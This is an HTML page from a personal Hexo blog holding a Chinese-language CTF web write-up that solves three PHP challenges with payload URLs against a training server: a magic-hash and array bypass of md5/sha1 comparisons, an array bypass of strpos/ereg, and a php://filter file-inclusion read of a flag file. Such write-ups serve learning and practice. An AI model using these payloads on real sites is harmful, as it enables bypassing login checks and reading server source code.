@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="web 题解 basic php参考:https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ playload1（参考23）:http://123.207.149.64:23331/feature/?name=1&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web 题解(1)">
+<meta property="og:url" content="http://yoursite.com/2019/07/22/postweb-题解-1/index.html">
+<meta property="og:site_name" content="Conlonial&#39;s blog">
+<meta property="og:description" content="web 题解 basic php参考:https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ playload1（参考23）:http://123.207.149.64:23331/feature/?name=1&amp;a">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-22T12:52:43.578Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="web 题解(1)">
+<meta name="twitter:description" content="web 题解 basic php参考:https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ playload1（参考23）:http://123.207.149.64:23331/feature/?name=1&amp;a">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/22/postweb-题解-1/">
+
+
+
+
+
+  <title>web 题解(1) | Conlonial's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Conlonial's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/22/postweb-题解-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Conlonial">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Conlonial's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">web 题解(1)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T20:20:27+08:00">
+                2019-07-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="web-题解"><a href="#web-题解" class="headerlink" title="web 题解 "></a><center>web 题解 </center></h1><h2 id="basic-php"><a href="#basic-php" class="headerlink" title="basic php"></a>basic php</h2><h5 id="参考"><a href="#参考" class="headerlink" title="参考:"></a><p align="left">参考:</p></h5><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<h5 id="playload1（参考23）-http-123-207-149-64-23331-feature-name-1-amp-password-1-amp-test-QNKCDZO"><a href="#playload1（参考23）-http-123-207-149-64-23331-feature-name-1-amp-password-1-amp-test-QNKCDZO" class="headerlink" title="playload1（参考23）:http://123.207.149.64:23331/feature/?name=1&amp;password=1&amp;test=QNKCDZO"></a><p align="left">playload1（参考23）:</p><code>http://123.207.149.64:23331/feature/?name=1&amp;password=1&amp;test=QNKCDZO</code></h5><h3 id="另：不赋值的方法本题不使用，具体原因待测"><a href="#另：不赋值的方法本题不使用，具体原因待测" class="headerlink" title="另：不赋值的方法本题不使用，具体原因待测"></a>另：不赋值的方法本题不使用，具体原因待测</h3><h5 id="playload2（参考07）-http-123-207-149-64-23331-feature-name-1-amp-password-2-amp-test-QNKCDZO"><a href="#playload2（参考07）-http-123-207-149-64-23331-feature-name-1-amp-password-2-amp-test-QNKCDZO" class="headerlink" title="playload2（参考07）:http://123.207.149.64:23331/feature/?name[]=1&amp;password[]=2&amp;test=QNKCDZO"></a><p align="left">playload2（参考07）:</p><code>http://123.207.149.64:23331/feature/?name[]=1&amp;password[]=2&amp;test=QNKCDZO</code></h5><h3 id="Hint：由于sha1-函数和md5-函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if-GET-39-name-39-GET-39-password-39-和else-if-sha1-GET-39-name-39-sha1-GET-39-password-39-检测。"><a href="#Hint：由于sha1-函数和md5-函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if-GET-39-name-39-GET-39-password-39-和else-if-sha1-GET-39-name-39-sha1-GET-39-password-39-检测。" class="headerlink" title="Hint：由于sha1()函数和md5()函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])和else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))检测。"></a>Hint：由于sha1()函数和md5()函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过<code>if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])</code>和<code>else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))</code>检测。</h3><h2 id="basic-php2"><a href="#basic-php2" class="headerlink" title="basic php2"></a>basic php2</h2><h5 id="参考-https-www-bodkin-ren-index-php-archives-168-ereg-和strpos-部分例子"><a href="#参考-https-www-bodkin-ren-index-php-archives-168-ereg-和strpos-部分例子" class="headerlink" title="参考:https://www.bodkin.ren/index.php/archives/168/  ereg()和strpos()部分例子"></a><p align="left">参考:</p><a href="https://www.bodkin.ren/index.php/archives/168/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/168/</a>  ereg()和strpos()部分例子</h5><h5 id="1-is-int-函数用于检测变量是否是整数。"><a href="#1-is-int-函数用于检测变量是否是整数。" class="headerlink" title="1. is_int() 函数用于检测变量是否是整数。"></a>1. is_int() 函数用于检测变量是否是整数。</h5><h5 id="2-strpos-函数：查找字符串在另一字符串中第一次出现的位置。"><a href="#2-strpos-函数：查找字符串在另一字符串中第一次出现的位置。" class="headerlink" title="2. strpos() 函数：查找字符串在另一字符串中第一次出现的位置。"></a>2. strpos() 函数：查找字符串在另一字符串中第一次出现的位置。</h5><h3 id="Hint-strpos-函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；"><a href="#Hint-strpos-函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；" class="headerlink" title="Hint: strpos() 函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；"></a><p align="left">Hint:</p> strpos() 函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；</h3><h5 id="playload-http-123-207-149-64-23360-user-27416cf22fc4ed74b1cd264585053b57fed14088-index-php-content-php"><a href="#playload-http-123-207-149-64-23360-user-27416cf22fc4ed74b1cd264585053b57fed14088-index-php-content-php" class="headerlink" title="playload: http://123.207.149.64:23360/user/27416cf22fc4ed74b1cd264585053b57fed14088/index.php?content[]=php"></a>playload: <code>http://123.207.149.64:23360/user/27416cf22fc4ed74b1cd264585053b57fed14088/index.php?content[]=php</code></h5><h2 id="Basicfileinclude"><a href="#Basicfileinclude" class="headerlink" title="Basicfileinclude"></a>Basicfileinclude</h2><h5 id="参考-1"><a href="#参考-1" class="headerlink" title="参考:"></a><p align="left">参考:</p></h5><pre><code>1. 白帽子php文件包含漏洞部分；
+2. http://mang0.me/archis/844a29d4/
+3. https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/ 
+4. https://xz.aliyun.com/t/3085
+</code></pre><h5 id="由上述可知关键在-php-filter-可以读取本地文件，而-index-php-file-php-filter-read-convert-base64-encode-resource-index-php"><a href="#由上述可知关键在-php-filter-可以读取本地文件，而-index-php-file-php-filter-read-convert-base64-encode-resource-index-php" class="headerlink" title="由上述可知关键在 php://filter 可以读取本地文件，而 index.php?file=php://filter/read=convert.base64-encode/resource=index.php"></a>由上述可知关键在 <code>php://filter</code> 可以读取本地文件，而 <code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></h5><p>指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p>
+<h5 id="playload-http-123-207-149-64-23338-page-php-filter-read-convert-base64-encode-resource-flag"><a href="#playload-http-123-207-149-64-23338-page-php-filter-read-convert-base64-encode-resource-flag" class="headerlink" title="playload:http://123.207.149.64:23338/?page=php://filter/read=convert.base64-encode/resource=flag"></a><p align="left">playload:</p><code>http://123.207.149.64:23338/?page=php://filter/read=convert.base64-encode/resource=flag</code></h5><h5 id="ubuntu-base64解码指令：-echo-aGEgaGE-IHlvdSB3YW50IGZsYWc-IGZsYWcgaXMgaGVyZTw-cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8-LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo-base64-decode"><a href="#ubuntu-base64解码指令：-echo-aGEgaGE-IHlvdSB3YW50IGZsYWc-IGZsYWcgaXMgaGVyZTw-cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8-LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo-base64-decode" class="headerlink" title="ubuntu base64解码指令： echo aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo= | base64 --decode"></a><p align="left">ubuntu base64解码指令：</p> <code>echo aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo= | base64 --decode</code></h5>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/02/20100502进度/" rel="next" title="20100502进度">
+                <i class="fa fa-chevron-left"></i> 20100502进度
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Conlonial</p>
+              <p class="site-description motion-element" itemprop="description">recorder</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web-题解"><span class="nav-number">1.</span> <span class="nav-text">web 题解 </span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-php"><span class="nav-number">1.1.</span> <span class="nav-text">basic php</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考"><span class="nav-number">1.1.0.0.1.</span> <span class="nav-text">参考:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#playload1（参考23）-http-123-207-149-64-23331-feature-name-1-amp-password-1-amp-test-QNKCDZO"><span class="nav-number">1.1.0.0.2.</span> <span class="nav-text">playload1（参考23）:http://123.207.149.64:23331/feature/?name=1&amp;password=1&amp;test=QNKCDZO</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#另：不赋值的方法本题不使用，具体原因待测"><span class="nav-number">1.1.1.</span> <span class="nav-text">另：不赋值的方法本题不使用，具体原因待测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#playload2（参考07）-http-123-207-149-64-23331-feature-name-1-amp-password-2-amp-test-QNKCDZO"><span class="nav-number">1.1.1.0.1.</span> <span class="nav-text">playload2（参考07）:http://123.207.149.64:23331/feature/?name[]=1&amp;password[]=2&amp;test=QNKCDZO</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#Hint：由于sha1-函数和md5-函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if-GET-39-name-39-GET-39-password-39-和else-if-sha1-GET-39-name-39-sha1-GET-39-password-39-检测。"><span class="nav-number">1.1.2.</span> <span class="nav-text">Hint：由于sha1()函数和md5()函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])和else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))检测。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-php2"><span class="nav-number">1.2.</span> <span class="nav-text">basic php2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考-https-www-bodkin-ren-index-php-archives-168-ereg-和strpos-部分例子"><span class="nav-number">1.2.0.0.1.</span> <span class="nav-text">参考:https://www.bodkin.ren/index.php/archives/168/  ereg()和strpos()部分例子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-is-int-函数用于检测变量是否是整数。"><span class="nav-number">1.2.0.0.2.</span> <span class="nav-text">1. is_int() 函数用于检测变量是否是整数。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-strpos-函数：查找字符串在另一字符串中第一次出现的位置。"><span class="nav-number">1.2.0.0.3.</span> <span class="nav-text">2. strpos() 函数：查找字符串在另一字符串中第一次出现的位置。</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hint-strpos-函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；"><span class="nav-number">1.2.1.</span> <span class="nav-text">Hint: strpos() 函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#playload-http-123-207-149-64-23360-user-27416cf22fc4ed74b1cd264585053b57fed14088-index-php-content-php"><span class="nav-number">1.2.1.0.1.</span> <span class="nav-text">playload: http://123.207.149.64:23360/user/27416cf22fc4ed74b1cd264585053b57fed14088/index.php?content[]=php</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basicfileinclude"><span class="nav-number">1.3.</span> <span class="nav-text">Basicfileinclude</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考-1"><span class="nav-number">1.3.0.0.1.</span> <span class="nav-text">参考:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#由上述可知关键在-php-filter-可以读取本地文件，而-index-php-file-php-filter-read-convert-base64-encode-resource-index-php"><span class="nav-number">1.3.0.0.2.</span> <span class="nav-text">由上述可知关键在 php://filter 可以读取本地文件，而 index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#playload-http-123-207-149-64-23338-page-php-filter-read-convert-base64-encode-resource-flag"><span class="nav-number">1.3.0.0.3.</span> <span class="nav-text">playload:http://123.207.149.64:23338/?page=php://filter/read=convert.base64-encode/resource=flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ubuntu-base64解码指令：-echo-aGEgaGE-IHlvdSB3YW50IGZsYWc-IGZsYWcgaXMgaGVyZTw-cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8-LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo-base64-decode"><span class="nav-number">1.3.0.0.4.</span> <span class="nav-text">ubuntu base64解码指令： echo aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo= | base64 --decode</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Conlonial</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
